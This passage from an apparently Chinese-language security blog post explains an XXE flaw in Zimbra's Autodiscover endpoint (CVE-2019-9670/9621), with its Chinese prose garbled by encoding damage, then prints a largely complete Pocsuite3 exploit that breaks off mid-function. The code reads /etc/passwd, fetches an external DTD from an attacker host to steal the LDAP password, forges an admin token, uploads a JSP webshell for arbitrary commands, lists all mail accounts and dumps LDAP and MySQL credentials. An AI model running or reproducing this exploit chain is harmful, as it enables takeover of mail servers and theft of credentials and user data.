src="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" alt="image-20230403125818642"></a></p><p>è¿™é‡Œå¯¹responseSchemaä¹Ÿå°±æ˜¯AcceptableResponseSchemaæ ‡ç­¾ä¸­çš„å€¼è¿›è¡Œäº†åˆ¤æ–­ï¼Œè‹¥ä¸ç­‰äº<code>http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006</code>æˆ–è€…<code>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</code>åˆ™è¿”å›503ä»¥åŠRequested response schema not availableå†åŠ ä¸ŠresponseSchemaçš„å€¼ã€‚å› æ­¤æ­¤å¤„å­˜åœ¨å›æ˜¾å‹xxeã€‚å‡è®¾ä¼ å…¥å¦‚ä¸‹xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶emailä¸ä¸ºç©ºä¸”responseSchemaçš„å€¼ä¸º&#x2F;etc&#x2F;passwdçš„å†…å®¹ï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸè¯»å–&#x2F;etc&#x2F;passwdçš„å€¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" title="image-20230403131401470" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" alt="image-20230403131401470"></a></p><p>å¯ä»¥çœ‹åˆ°è¿”å›çš„ç»“æœæ­£æ˜¯<code>Requested response schema not available + /etc/passwd</code>ï¼Œä¹‹åçš„adminTokençš„è·å–ä¹Ÿæ­£æ˜¯åŸºäºæ­¤åŸç†è¯»å–&#x2F;opt&#x2F;zimbra&#x2F;conf&#x2F;localconfig.xmlæ–‡ä»¶è·å–zimbra_ldap_passwordã€‚ä¸è¿‡å› ä¸ºlocalconfig.xmlæ–‡ä»¶ä¼šåœ¨è§£æå™¨ä¸­è¢«è§£æï¼Œæ— æ³•ä»¥æ–‡æœ¬å½¢å¼é€šè¿‡XXEæ¼æ´è¢«è¯»å‡ºï¼Œéœ€è¦åŠ ä¸Š<code>&lt;![CDATA[]]&gt;</code>ï¼Œæ‰€ä»¥é‡‡ç”¨å¤–éƒ¨DTDçš„æ–¹å¼è¯»å–ã€‚</p><h3 id="Pocsuite-POC"><a href="#Pocsuite-POC" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;è¿œç¨‹ä»£ç æ‰§è¡Œ&#x27;</span></span><br><span class="line">    <span class="comment"># ä¸¥é‡ é«˜å± ä¸­å± ä½å±</span></span><br><span class="line">    level = <span class="string">&#x27;ä¸¥é‡&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2019-9670 CVE-2019-9621&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt; 8.7.11&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title=&quot;Zimbra ç®¡ç†&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbraæä¾›ä¸€å¥—å¼€æºååŒåŠå…¬å¥—ä»¶åŒ…æ‹¬WebMailï¼Œæ—¥å†ï¼Œé€šä¿¡å½•ï¼ŒWebæ–‡æ¡£ç®¡ç†å’Œåˆ›ä½œã€‚å®ƒæœ€å¤§çš„ç‰¹è‰²åœ¨äºå…¶é‡‡ç”¨AjaxæŠ€æœ¯æ¨¡ä»¿CSæ¡Œé¢åº”ç”¨è½¯ä»¶çš„é£æ ¼å¼€å‘çš„å®¢æˆ·ç«¯å…¼å®¹Firefox,Safariå’ŒIEæµè§ˆå™¨ã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    å½“ Zimbra å­˜åœ¨åƒä»»æ„æ–‡ä»¶è¯»å–ã€XXEï¼ˆxmlå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰è¿™ç§æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¯»å– localconfig.xmlé…ç½®æ–‡ä»¶ï¼Œè·å–åˆ° zimbra admin ldap passwordï¼Œå¹¶é€šè¿‡ 7071 admin ç«¯å£è¿›è¡Œ SOAP AuthRequest è®¤è¯ï¼Œå¾—åˆ° admin authtokenæ¼æ´æ˜¯åˆ©ç”¨XXEå’ŒProxyServlet SSRF æ¼æ´æ‹¿åˆ° admin authtoken åï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ åœ¨æœåŠ¡ç«¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¨èƒç¨‹åº¦æé«˜ã€‚å½“ZimbraæœåŠ¡ç«¯æ‰“æ¥Memcachedç¼“å­˜æœåŠ¡æ˜¯ï¼Œå¯ä»¥åˆ©ç”¨SSRFæ”»å‡»è¿›è¡Œååºåˆ—åŒ–æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra å®˜æ–¹ä¸‹è½½æœ€æ–°ç‰ˆæœ¬è¿›è¡Œä¿®å¤:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        xml_check = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="string">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span></span><br><span class="line"><span class="string"> &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">  &lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml_check.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error 503 Requested response&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_adminToken</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#https://raw.githubusercontent.com/nth347/Zimbra-RCE-exploit/master/malicious_dtd</span></span><br><span class="line">        xml1 = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.135.1:1234/1.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml1.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&amp;lt;/key&amp;gt;\s*&amp;lt;key name=&quot;zimbra_ldap_password&quot;&amp;gt;\s*&amp;lt;value&amp;gt;(.*?)&amp;lt;/value&amp;gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line">            xml2 = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">                   &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">                       &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span></span><br><span class="line"><span class="string">                   &lt;/context&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">                 &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;</span></span><br><span class="line"><span class="string">                    &lt;password&gt;&#123;&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">                 &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">            &lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(password)</span><br><span class="line">            r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml2.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=(.*?);&#x27;</span>)</span><br><span class="line">            adminToken = re.findall(pattern, r.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">            adminToken = <span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span> + adminToken</span><br><span class="line">            <span class="keyword">return</span> adminToken</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        self.adminToken = self.get_adminToken()</span><br><span class="line">        fileName = random_str(<span class="number">7</span>)+<span class="string">&quot;.jsp&quot;</span></span><br><span class="line">        file = &#123;</span><br><span class="line">            <span class="string">&#x27;filename1&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;whocare&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">            <span class="string">&#x27;clientFile&#x27;</span>: (fileName,</span><br><span class="line">                           <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;requestId&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;12&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&quot;/service/extension/clientUploader/upload&quot;</span>, files=file, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        self.webshell = (fileName, <span class="string">&quot;sMuw1P2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;<span class="string">&#x27;sMuw1P2&#x27;</span>: command&#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/downloads/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshell[<span class="number">0</span>]), data=data, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;&lt;soap:Header&gt;&lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;authToken&gt;&#123;&#125;&lt;/authToken&gt;</span></span><br><span class="line"><span class="string">&lt;/context&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;GetAllAccountsRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/GetAllAccountsRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(self.adminToken.replace(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        users = []</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;account name=&quot;(.*?)&quot; id=&quot;(.*?)&quot;&gt;[\s\S]*?&lt;a n=&quot;cn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;a n=&quot;sn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;/account&gt;&#x27;</span>)</span><br><span class="line">        result = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            userinfo = &#123;<span class="string">&#x27;zimbraId&#x27;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;sn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;cn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">            userinfo[<span class="string">&#x27;email&#x27;</span>] = i[<span class="number">0</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;zimbraId&#x27;</span>] = i[<span class="number">1</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;cn&#x27;</span>] = i[<span class="number">2</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;sn&#x27;</span>] = i[<span class="number">3</span>]</span><br><span class="line">            users.append(userinfo.copy())</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span>, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = 